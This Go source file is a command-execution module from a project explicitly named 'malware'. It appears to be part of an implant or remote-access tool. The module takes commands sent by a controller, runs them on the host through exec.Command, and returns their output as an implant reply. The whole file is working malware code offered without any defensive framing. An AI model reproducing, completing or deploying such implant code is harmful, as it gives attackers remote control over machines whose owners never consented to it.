package sh

import (
	"malware/common"
	"malware/common/messages"
	"malware/common/types"
	"os/exec"
)

type state struct {
	running bool
}

type settings struct {
	state *state // Tell our loop to stop
}

// Create creates an implementation of settings
func Create() types.Module {
	state := state{running: false}
	return settings{&state}
}

func (settings settings) HandleMessage(message *messages.CheckCmdReply, callback func(*messages.ImplantReply)) {
	cmd := message.GetExec()
	if cmd == nil {
		return
	}

	out, err := exec.Command(cmd.Exec, cmd.Args...).Output()
	if err != nil {
		common.Panicf(err, "Error on running command: %s", message)
	}

	callback(&messages.ImplantReply{Module: "sh", Args: out})
}

// Init the state of this module
func (settings settings) Init() {
	settings.state.running = true
}

func (settings settings) Shutdown() {
	settings.state.running = false
}

func (settings) ID() string { return "adam" }
